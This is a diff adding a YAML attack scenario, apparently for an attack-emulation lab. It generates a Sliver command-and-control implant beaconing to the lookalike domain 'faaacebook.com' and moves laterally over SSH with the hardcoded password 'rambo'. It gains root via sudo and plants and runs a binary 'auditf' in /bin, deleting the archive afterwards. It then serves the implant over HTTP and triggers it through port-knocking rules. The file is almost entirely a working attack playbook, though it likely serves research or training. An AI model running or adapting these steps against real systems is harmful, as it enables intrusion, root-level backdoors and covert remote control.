@@ -1,0 +1,150 @@
+####################
+#
+# Scenario 4
+#
+####################
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $REPOSERVER_ADDRESS: 172.17.100.122
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $FIREWALL_ADDRESS: 172.17.100.254
+  $LINUXSHARE_ADRESS: 192.168.100.23
+
+
+commands:
+  - type: sliver
+    cmd: "generate_implant"
+    c2url: "https://faaacebook.com"
+    name: "super-sliver1"
+
+  - type: sliver
+    cmd: start_https_listener
+    host: 0.0.0.0
+    port: 443
+
+  - type: shell
+    cmd: sshpass -p 'rambo' scp -o StrictHostKeyChecking=no -o ProxyCommand="sshpass -p 'rambo' ssh -o StrictHostKeyChecking=no -p 10022 john@$SERVER_ADDRESS nc $FIREWALL_ADDRESS 22" /home/aecid/auditf.tar.gz john@$FIREWALL_ADDRESS:/tmp/auditf.tar.gz
+  
+  - type: ssh
+    creates_session: "foothold"
+    username: john
+    password: rambo
+    hostname: $SERVER_ADDRESS
+    port: 10022
+    cmd: id
+
+  - type: ssh
+    session: foothold
+    cmd: "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@172.17.100.254\n"
+    interactive: True
+  
+  - type: sleep
+    seconds: 2
+
+  - type: ssh
+    session: foothold
+    cmd: "rambo\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo -i\n"
+    interactive: True
+  
+  - type: sleep
+    seconds: 2
+
+  - type: ssh
+    session: foothold
+    cmd: "rambo\n"
+    interactive: True
+  
+  - type: ssh
+    session: foothold
+    cmd: "sudo tar -xzf /tmp/auditf.tar.gz -C /bin\n"
+    interactive: True
+
+#  - type: sleep
+#    seconds: 2
+#
+#  - type: ssh
+#    session: foothold
+#    cmd: "rambo\n"
+#    interactive: True
+
+
+  - type: ssh
+    session: foothold
+    cmd: "rm /tmp/auditf.tar.gz\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cd /bin && chown root:root auditf && sudo ./auditf\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "rambo\n"
+    interactive: True
+
+  - type: webserv
+    local_path: $LAST_SLIVER_IMPLANT
+    port: 8000
+    background: true
+
+  - type: sleep
+    seconds: 5
+
+  - type: shell
+    cmd: /home/aecid/knock-cli -c knock.yaml -r knock-firewall
+
+  - type: shell
+    cmd: whoami
+
+  - type: sleep
+    seconds: 5
+
+  - type: shell
+    cmd: /home/aecid/knock-cli -c knock.yaml -r execute-implant1
+
+  - type: shell
+    cmd: /home/aecid/knock-cli -c knock.yaml -r execute-implant2
+
+  - type: sliver-session
+    cmd: ps
+    session: super-sliver1
+
+# implant has to be made executable, and the knock command must have the permissions to execute 
+
+
+
+#  - type: shell
+#    cmd: /home/aecid/knock-cli -c knock.yaml -r execute-implant
+
+
+
+
+    
+#  - type: ssh
+#    cmd: iptables -A FORWARD -s $REPOSERVER_ADDRESS -d 192.168.100.23 -j ACCEPT
+#    session: 
+
+
+# && chown john:john auditf &&
+
+
+
+
+
+
+
+
+
+
+  
+ 
+
+
+
+        
